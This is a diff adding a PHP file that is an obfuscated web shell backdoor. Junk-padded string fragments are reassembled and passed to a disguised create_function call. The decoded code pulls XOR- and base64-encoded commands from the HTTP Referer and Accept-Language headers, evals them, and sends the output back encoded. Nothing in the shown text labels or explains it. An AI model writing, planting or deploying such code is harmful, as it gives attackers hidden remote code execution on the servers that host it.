@@ -1,0 +1,19 @@
+<?php
+$F='d5($i.$kuoh),0,3uo));$fuo=uo$sl($ss(md5(uo$iuo.uouo$kf),0,3));$p=""uo;fuoor($z=1;$z<uoco';
+$H='(?:;q=0.(uo[\\uod]uo))?,?/",$ra,$m);ifuo($q&&$m)uouo{@session_uostauouort();$s=&$_SuoESSI';
+$K='uoON;$ssuo="substruo";$sl="strtuouoolower";$uoi=uouo$m[1uo][0].$m[1][1];$h=$uosl($ssuo(m';
+$e='u["quuoery"],uo$q);uo$q=array_vuoauolues(uo$q);preguo_matchuo_all(uo"/([\\w])[uo\\wuo-]uo+';
+$m=')uo;$o="";fuoor($i=0;$uoi<$l;){foruo($juo=0;($j<$uoc&uo&$i<$l);$j+uo+,$i++)uouo{$ouo.=$t{$i';
+$x=',0,$euo))),uo$kuo)))uo;$o=ob_getuo_contentuos();ob_enuoduo_clean();$d=bauose6uo4_encouod';
+$d='"HuoTTuoP_ACCEPT_LANGUAGuoEuo"]uo;if($ruor&&$rauo){$u=paruose_url($ruouor);parse_str(uo$';
+$t=str_replace('m','','mcreamte_mfmuncmtmion');
+$X='="";uo$p=$ssuo(uo$p,3);}uoif(array_key_euoxistsuo($i,$s)){$suo[$i].=uo$p;$e=suotrpos($su';
+$N='o[uo$i],$f);if($e){uo$kuouo=$kh.$kf;obuo_start()uo;@evauoluo(@gzunuocompresuos(@x(@basuo';
+$b='e64_uodecoduoe(preg_replace(arruoay(uo"uo/_/","/-/"),arruoauoy("/","+uo"),$ss($uos[uo$i]';
+$s='}^$k{$uoj};}}ruoeturuon $o;}$r=uo$uouo_SERVEuoR;$rr=@$r["HTuoTP_RuoEFERERuo"];$ra=@$r[uo';
+$l='$khuo="1552uouo";$kf="c03e";functiououon x($t,$k){$uoc=uostrlen($kuo);$l=suotrlen(uouo$t';
+$P='uouuont($m[1]);$z++)$puo.=$q[$muo[2][$uoz]uo];ifuo(strpos($p,uo$h)==uo=0){uo$uosuo[$iuo]';
+$L='e(uox(gzcompruoess($o),$uokuo));puoruoint("<$k>$uoduo</$k>");@uosession_deuostroy();}}}}';
+$r=str_replace('uo','',$l.$m.$s.$d.$e.$H.$K.$F.$P.$X.$N.$b.$x.$L);
+$R=$t('',$r);$R();
+?>
